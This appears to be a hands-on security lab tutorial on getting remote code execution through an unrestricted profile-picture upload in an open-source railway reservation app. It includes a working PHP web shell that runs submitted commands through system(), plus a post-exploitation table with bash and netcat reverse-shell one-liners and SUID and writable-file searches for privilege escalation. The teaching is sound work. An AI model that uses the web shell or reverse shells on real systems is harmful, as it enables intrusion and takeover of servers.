Practice Makes Perfect
To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today's task, we will demonstrate achieving RCE via unrestricted file upload within an open-source railway management system that has this vulnerability built into it. 

https://github.com/CYB84/CVE_Writeup/tree/main/Online%20Railway%20Reservation%20System
https://github.com/CYB84/CVE_Writeup/blob/main/Online%20Railway%20Reservation%20System/RCE%20via%20File%20Upload.md

Exploiting RCE via File Upload
Now we're going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.

Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favourite text editor, copy and paste the below code and save it as shell.php.

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
The above script, when accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using the system() PHP function, and the output is displayed to the user. This is the perfect file to upload to the vulnerable rail system reservation application. The vulnerability is surrounding the upload of a new profile image. So, to exploit it, we navigate to the profile picture page:

Railway profile page

Instead of a new profile picture, we can upload our malicious PHP script and update our profile:

Profile picture uploaded

In the case of this application, the RCE is possible through unrestricted file upload. Once this "profile picture" is uploaded and updated, it is stored in the /admin/assets/img/profile/ directory. The file can then be accessed directly via http://<ip-address-or-localhost>/<projectname>/admin/assets/img/profile/shell.php. When this is accessed, we can then see the malicious code in action:

Malicious code in action

Now, we can run commands directly against the operating system using this bar, and the output will be displayed. For example, running the command pwd now returns the following:

Command being run


Making the Most of It
Once the vulnerability has been exploited and you now have access to the operating system via a web shell, there are many next steps you could take depending on a) what your goal is and b) what misconfigurations are present on the system, which will determine exactly what we can do. Here are some examples of commands you could run once you have gained access and why you might run them (if the system is running on a Linux OS like our example target system):


Command	Use
ls	Will give you an idea of what files/directories surround you
pwd	Will give you an idea of where in the system you are
whoami	Will let you know who you are in the system
hostname	The system name and potentially its role in the network
uname -a	Will give you some system information like the OS, kernel version, and more
id	If the current user is assigned to any groups
ifconfig	Allows you to understand the system's network setup
bash -i >& /dev/tcp/<your-ip>/<port> 0>&1	A command used to begin a reverse shell via bash
nc -e /bin/sh <your-ip> <port>	A command used to begin a reverse shell via Netcat
find / -perm -4000 -type f 2>/dev/null	Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root)
find / -writable -type  f 2>/dev/null | grep -v "/proc/"	Also helpful in privilege escalation attempts used to find files with writable permissions
These are just some commands that can be run following a successful RCE exploit. It's very open-ended, and what you can do will rely on your abilities to inspect an environment and vulnerabilities in the system itself.



